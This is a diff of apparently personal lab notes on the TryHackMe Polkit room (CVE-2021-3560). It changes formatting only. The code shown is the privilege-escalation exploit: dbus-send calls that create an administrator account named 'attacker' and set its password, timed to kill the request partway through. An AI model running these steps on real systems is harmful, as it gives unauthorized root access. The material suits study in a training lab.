@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-02-13-tryhackme-polkit.html
 author: 100007
 ---
 
-# TryHackMe: Polkit
-
-**author:** Nathan Acks  
-**date:** 2022-02-13
-
 # Polkit (CVE-2021-3560)
 
 ## Background
@@ -40,14 +35,14 @@ The race condition is obviously kind of tricky, so best to request something tha
 
 ```
 dbus-send \
---system \
---dest=org.freedesktop.Accounts \
---type=method_call \
---print-reply /org/freedesktop/Accounts \
-org.freedesktop.Accounts.CreateUser \
-string:attacker \
-string:"Pentester Account" \
-int32:1
+	--system \
+	--dest=org.freedesktop.Accounts \
+	--type=method_call \
+	--print-reply /org/freedesktop/Accounts \
+	              org.freedesktop.Accounts.CreateUser \
+	              string:attacker \
+	              string:"Pentester Account" \
+	              int32:1
 ```
 
 The three parameters are:
@@ -60,28 +55,28 @@ The three parameters are:
 
 ```
 time dbus-send \
---system \
---dest=org.freedesktop.Accounts \
---type=method_call \
---print-reply /org/freedesktop/Accounts \
-org.freedesktop.Accounts.CreateUser \
-string:attacker \
-string:"Pentester Account" \
-int32:1
+	--system \
+	--dest=org.freedesktop.Accounts \
+	--type=method_call \
+	--print-reply /org/freedesktop/Accounts \
+	              org.freedesktop.Accounts.CreateUser \
+	              string:attacker \
+	              string:"Pentester Account" \
+	              int32:1
 ```
 
 (3) DBus needs to be killed approximately _halfway_ through this execution period. We _cannot_ wait for the application to return, so instead we background it.
 
 ```
 dbus-send \
---system \
---dest=org.freedesktop.Accounts \
---type=method_call \
---print-reply /org/freedesktop/Accounts \
-org.freedesktop.Accounts.CreateUser \
-string:attacker \
-string:"Pentester Account" \
-int32:1 & \
+	--system \
+	--dest=org.freedesktop.Accounts \
+	--type=method_call \
+	--print-reply /org/freedesktop/Accounts \
+	              org.freedesktop.Accounts.CreateUser \
+	              string:attacker \
+	              string:"Pentester Account" \
+	              int32:1 & \
 sleep ${TIME}s; kill $!
 ```
 
@@ -103,13 +98,13 @@ openssl passwd -6 $PASSWORD
 
 ```
 dbus-send \
---system \
---dest=org.freedesktop.Accounts \
---type=method_call \
---print-reply /org/freedesktop/Accounts/User$UID \
-org.freedesktop.Accounts.User.SetPassword \
-string:'$PASSWORD_HASH' \
-string:'Ask the pentester' & \
+	--system \
+	--dest=org.freedesktop.Accounts \
+	--type=method_call \
+	--print-reply /org/freedesktop/Accounts/User$UID \
+	              org.freedesktop.Accounts.User.SetPassword \
+	              string:'$PASSWORD_HASH' \
+	              string:'Ask the pentester' & \
 sleep ${TIME}s; kill $!
 ```
 
